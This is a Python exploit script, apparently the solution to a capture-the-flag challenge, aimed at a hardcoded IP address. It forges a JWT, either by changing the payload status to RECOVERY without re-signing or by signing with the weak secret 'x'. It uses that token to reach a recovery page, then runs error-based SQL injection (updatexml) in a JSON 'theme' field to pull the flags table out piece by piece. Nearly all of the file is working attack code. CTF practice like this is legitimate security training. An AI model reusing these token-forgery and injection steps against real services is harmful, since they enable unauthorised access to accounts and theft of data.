#!/usr/bin/env python3
import base64
import hashlib
import hmac
import json
import re
import sys
import time
from typing import Optional

import requests

BASE_URL = "http://39.105.213.28:5001"

LOGIN_USER = "test"
LOGIN_PASS = "test"
KNOWN_UID = 227

JWT_SECRET = "x"
CHUNK_SIZE = 16
TIMEOUT = 20
RETRIES = 3


def b64u(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def make_session() -> requests.Session:
    sess = requests.Session()
    sess.trust_env = False
    return sess


def request_with_retry(method: str, url: str, session: Optional[requests.Session] = None, **kwargs) -> requests.Response:
    last_exc = None
    sess = session or make_session()
    for attempt in range(1, RETRIES + 1):
        try:
            return sess.request(method, url, **kwargs)
        except requests.RequestException as exc:
            last_exc = exc
            if attempt == RETRIES:
                raise
            time.sleep(1.0 * attempt)
    raise last_exc


def make_recovery_token_cookie(uid: int, username: str) -> str:
    """Cookie 方式：改 payload status，不重新签名"""
    sess = make_session()
    resp = request_with_retry(
        "POST", BASE_URL + "/login",
        session=sess,
        data={"username": username, "password": LOGIN_PASS},
        allow_redirects=False, timeout=TIMEOUT,
    )
    if resp.status_code != 302:
        resp = request_with_retry(
            "POST", BASE_URL + "/login",
            data={"username": username, "password": LOGIN_PASS},
            allow_redirects=False, timeout=TIMEOUT,
        )
    token = sess.cookies.get("token", "")
    if not token:
        # 登录失败直接用 uid 构造
        return _forge_by_payload(uid, username)
    return _modify_status(token, uid, username)


def _modify_status(original: str, uid: int, username: str) -> str:
    """直接改 payload 里的 status，签名不变"""
    h, p, s = original.split(".")
    p += "=" * ((4 - len(p) % 4) % 4)
    payload = json.loads(base64.urlsafe_b64decode(p))
    payload["status"] = "RECOVERY"
    payload["exp"] = 9999999999
    new_p = b64u(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{new_p}.{s}"


def _forge_by_payload(uid: int, username: str) -> str:
    """备用：用密钥 x 正常签名"""
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {
        "uid": uid, "username": username,
        "status": "RECOVERY", "exp": 1779999999,
    }
    msg = (
        b64u(json.dumps(header, separators=(",", ":")).encode())
        + "." + b64u(json.dumps(payload, separators=(",", ":")).encode())
    )
    sig = b64u(hmac.new(JWT_SECRET.encode(), msg.encode(), hashlib.sha256).digest())
    return msg + "." + sig


def login_and_get_uid(username: str, password: str) -> Optional[int]:
    sess = make_session()
    resp = request_with_retry(
        "POST", BASE_URL + "/login",
        session=sess,
        data={"username": username, "password": password},
        allow_redirects=False, timeout=TIMEOUT,
    )
    if resp.status_code != 302 or resp.headers.get("Location") != "/dashboard":
        return None
    dash = sess.get(BASE_URL + "/dashboard", timeout=TIMEOUT)
    match = re.search(r"<td>\s*(\d+)\s*</td>", dash.text)
    if not match:
        raise RuntimeError(f"uid parse failed for {username}")
    return int(match.group(1))


def ensure_recovery_open(token: str) -> bool:
    """访问 /recovery，用 Cookie 方式传 JWT"""
    resp = request_with_retry(
        "GET", BASE_URL + "/recovery",
        headers={"Cookie": f"token={token}"},
        allow_redirects=False, timeout=TIMEOUT,
    )
    return resp.status_code == 200 and "temp_" in resp.text


def leak_expr(token: str, expr: str) -> str:
    """报错注入提取数据"""
    theme = (
        "a' AND updatexml(1,concat(0x7e,("
        + expr + "),0x7e),1) AND '1'='1"
    )
    resp = request_with_retry(
        "POST", BASE_URL + "/api/v1/user/sync",
        headers={
            "Cookie": f"token={token}",
            "Content-Type": "application/json",
        },
        json={"theme": theme, "language": "zh"},
        allow_redirects=False, timeout=TIMEOUT,
    )
    try:
        data = resp.json()
    except Exception as exc:
        raise RuntimeError(f"non-json response: {resp.text[:200]!r}") from exc
    error = data.get("error", "")
    match = re.search(r"~(.*?)~", error)
    if not match:
        raise RuntimeError(f"no xpath leak: {error!r}")
    return match.group(1)


def main() -> int:
    print("[*] ====== 账号恢复大冒险 Exploit ======")
    print(f"[*] target: {BASE_URL}")
    print(f"[*] account: {LOGIN_USER}/{LOGIN_PASS}")
    print()

    # Step 1: 获取 uid
    print(f"[*] logging in...")
    uid = login_and_get_uid(LOGIN_USER, LOGIN_PASS)
    if uid is None:
        print(f"[!] login failed, using known uid={KNOWN_UID}")
        uid = KNOWN_UID
    else:
        print(f"[+] uid = {uid}")

    # Step 2: 构造 RECOVERY JWT（Cookie 方式）
    print(f"[*] forging recovery JWT (cookie mode)...")
    token = make_recovery_token_cookie(uid, LOGIN_USER)
    print(f"[+] token: {token[:60]}...")

    # Step 3: 访问 /recovery
    print(f"[*] accessing /recovery...")
    if ensure_recovery_open(token):
        print(f"[+] recovery mode active!")
    else:
        print(f"[!] recovery check failed, trying anyway...")

    # Step 4: 注入提取
    print(f"[*] probing database...")
    try:
        db = leak_expr(token, "database()")
        print(f"[+] database = {db}")
    except Exception as exc:
        print(f"[!] {exc}")
        return 1

    print(f"[*] extracting flag from flags table...")
    parts = []
    for pos in range(1, 200, CHUNK_SIZE):
        expr = f"substring((select group_concat(flag) from flags),{pos},{CHUNK_SIZE})"
        try:
            chunk = leak_expr(token, expr)
        except Exception as exc:
            print(f"[!] at pos {pos}: {exc}")
            break
        print(f"[+] chunk @{pos}: {chunk}")
        if not chunk:
            break
        parts.append(chunk)
        if "}" in chunk:
            break

    flag = "".join(parts)
    match = re.search(r"ISCC\{[^}]+\}", flag)
    if match:
        flag = match.group(0)
        print(f"\n{'='*50}")
        print(f"  FLAG: {flag}")
        print(f"{'='*50}")
    else:
        print(f"\n[!] flag not found in output: {flag!r}")
        return 1
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        print("\n[!] interrupted", file=sys.stderr)
        raise SystemExit(130)
